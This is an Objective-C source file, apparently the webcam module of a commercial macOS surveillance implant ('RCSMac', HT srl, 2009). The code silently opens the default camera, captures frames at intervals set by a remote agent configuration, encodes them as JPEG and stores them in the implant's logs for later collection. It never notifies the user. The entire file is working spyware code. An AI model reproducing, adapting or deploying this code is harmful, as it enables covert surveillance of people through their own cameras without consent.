/*
 * RCSMac - Webcam agent
 *
 *
 * Created by Massimo Chiodini on 05/08/2009
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <ApplicationServices/ApplicationServices.h>

#import "RCSMAgentWebcam.h"
#import "RCSMConfManager.h"

//#define DEBUG
#define BREAK_AND_FREE(x) {if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP) \
                          {if(x != nil) [(NSAutoreleasePool *)x release];break;}}

static RCSMAgentWebcam *sharedAgentWebcam = nil;

@interface RCSMAgentWebcam (hidden)

- (BOOL)_initSession;
- (BOOL)_releaseSession;
- (BOOL)_startSession;
- (BOOL)_stopSession;
- (BOOL)_startGrabImageWithFrame: (int)nFrame every: (int)seconds;
- (void)captureOutput: (QTCaptureOutput *)captureOutput 
  didOutputVideoFrame: (CVImageBufferRef)videoFrame 
     withSampleBuffer: (QTSampleBuffer *)sampleBuffer 
       fromConnection: (QTCaptureConnection *)connection;

@end

@implementation RCSMAgentWebcam (hidden)

- (BOOL)_initSession
{
  NSError *error;
  
  mCaptureSession = [[QTCaptureSession alloc] init];
  mDevice = [QTCaptureDevice defaultInputDeviceWithMediaType:QTMediaTypeVideo];
  
  if (![mDevice open: &error]) 
    {
#ifdef DEBUG
      if (error != nil)
        NSLog(@"initSession: device open - %@", [error localizedDescription]);
      else
        NSLog(@"initSession: device open [error unknow]");
#endif
      
      return NO;
    }
  
#ifdef DEBUG
  if ([mDevice isOpen] == YES)
    NSLog(@"initSession: device is open");
  else
    NSLog(@"initSession: device is closed");
#endif
  
  mCaptureDeviceInput = [[QTCaptureDeviceInput alloc] initWithDevice: mDevice];
  
  @synchronized(self)
    {
      if (![mCaptureSession addInput: mCaptureDeviceInput
                               error: &error]) 
        {
#ifdef DEBUG
      if(error != nil ) 
        NSLog(@"initSession: adding input device - %@", [error localizedDescription]);
      else
        NSLog(@"initSession: adding input device [error unknow]");
#endif    
          return NO;
        }
    }
  
  mCaptureDecompressedVideoOutput = [[QTCaptureDecompressedVideoOutput alloc] init];
  [mCaptureDecompressedVideoOutput setDelegate: self];
  
  @synchronized(self) 
    {
      if (![mCaptureSession addOutput: mCaptureDecompressedVideoOutput
                                error: &error]) 
        {
#ifdef DEBUG
        if(error != nil )
          NSLog(@"initSession: adding video output - %@", [error localizedDescription]);
        else
          NSLog(@"initSession: adding video output [error unknow]");
#endif    
          return NO;
        }
    }
  
  return YES;
}

- (BOOL)_startSession
{
  [mCaptureSession startRunning];
  
  if ([mCaptureSession isRunning] == NO) 
    return NO;
  
  return YES;
}

- (BOOL)_stopSession
{
  [mCaptureSession stopRunning];
  
  while([mCaptureSession isRunning] == YES) 
    usleep(1000);
  
  return YES;
}

- (BOOL)_releaseSession
{
  [mCaptureDecompressedVideoOutput release];
  [mCaptureDeviceInput release];
  [mCaptureSession release];
  [mDevice close];
  
  mImageGrabbed = NO;
  
  return YES;
}

- (BOOL)_startGrabImageWithFrame: (int)nFrame
                           every: (int)seconds
{
#ifdef DEBUG
  NSLog(@"startGrabImageWithFrame");
#endif
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  if ([self _startSession] == NO) 
    return NO;
  
  for (int i = 0; i < nFrame; i++)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      while (mImageGrabbed == NO | mCurrentImageBuffer == NULL)
        {
          BREAK_AND_FREE(nil);
          usleep(10000);
        }
      
      BREAK_AND_FREE(innerPool);
    
      NSBitmapImageRep *bitmap = [[NSBitmapImageRep alloc] 
                                  initWithCIImage: [CIImage imageWithCVImageBuffer: mCurrentImageBuffer]];
      NSData *dataBitmap = [bitmap representationUsingType: NSJPEGFileType
                                                properties: nil];    
      NSMutableData *dataImage = [[NSMutableData alloc] initWithData: dataBitmap];
      
#ifdef DEBUG_VERBOSE_1
      time_t uTime;
      time(&uTime);
      
      NSString *image_filename = [NSString stringWithFormat: @"/tmp/webcam-%.16X.jpg", uTime];
      [dataImage writeToFile: image_filename atomically: NO];
      NSLog(@"startGrabImageWitFrame: frame %d grabbed! frame ptr = 0x%x", i, mCurrentImageBuffer);
#endif
      
      RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
      BOOL success = [logManager createLog: AGENT_CAM
                               agentHeader: nil
                                 withLogID: 0];
      
      if (success == TRUE)
        {
          if ([logManager writeDataToLog: dataImage
                                forAgent: AGENT_CAM
                               withLogID: 0] == TRUE)
            {
#ifdef DEBUG
              NSLog(@"data written correctly");
#endif
            }
          
          [logManager closeActiveLog: AGENT_CAM
                           withLogID: 0];
        }
      
      [dataImage release];
      [bitmap release];
      
      for(int sc=0; sc < seconds; sc++)
        {
          BREAK_AND_FREE(nil);
          sleep(1);
        }
    
      @synchronized(self)
        {
          // Release/retain
          CVBufferRelease(mCurrentImageBuffer);
          mImageGrabbed = NO;
        }
      
      [innerPool release];
      
      BREAK_AND_FREE(nil);
    }
  
  if ([self _stopSession] == NO) 
    return NO;
  
#ifdef DEBUG
  NSLog(@"startGrabImageWitFrame: frames grabbing done!");
#endif
  
  [outerPool release];
  
  //sleep(seconds);
  
  return YES;  
}

- (void)captureOutput: (QTCaptureOutput *)captureOutput 
  didOutputVideoFrame: (CVImageBufferRef)videoFrame 
     withSampleBuffer: (QTSampleBuffer *)sampleBuffer 
       fromConnection: (QTCaptureConnection *)connection
{  
  if (videoFrame == nil )
    return;
  
  if (mImageGrabbed == YES)
    return;
  
  @synchronized(self)
    {
      CVBufferRetain(videoFrame);
      mCurrentImageBuffer = videoFrame;
      mImageGrabbed = YES;
    }
}

@end

@implementation RCSMAgentWebcam

+ (RCSMAgentWebcam *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentWebcam == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentWebcam;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentWebcam == nil)
      {
        sharedAgentWebcam = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentWebcam;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedAgentWebcam != nil)
      {
        self = [super init];
        
        if (self != nil)
          {
            sharedAgentWebcam = self;
            mImageGrabbed = NO;
          }
      }
  }
  
  return sharedAgentWebcam;
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG
  NSLog(@"Agent web started");
#endif
  
  [mAgentConfiguration setObject: AGENT_RUNNING
                          forKey: @"status"];
  
  if ([self _initSession] == NO)
    return;
  
  if ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
      [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
    {
      //NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      webcamStruct *wcRawData = (webcamStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
      
      if ([self _startGrabImageWithFrame: wcRawData->numOfFrame
                                   every: wcRawData->sleepTime] == YES)
        {
#ifdef DEBUG
          NSLog(@"Webcam grabbing done!");
#endif
        }
      else
        {
#ifdef DEBUG
          NSLog(@"An error occurred while grabbing from webcam");
#endif
        }
      
      //[innerPool release];
    }
  
  if ([self _releaseSession] == NO) 
    return;
  
  //if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
  [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
  
  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED &&
         internalCounter <= MAX_STOP_WAIT_TIME)
    {
      internalCounter++;
      sleep(1);
    }
  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mAgentConfiguration)
    {
      [mAgentConfiguration release];
      mAgentConfiguration = [aConfiguration retain];
    }
}

- (NSMutableDictionary *)mAgentConfiguration
{
  return mAgentConfiguration;
}

@end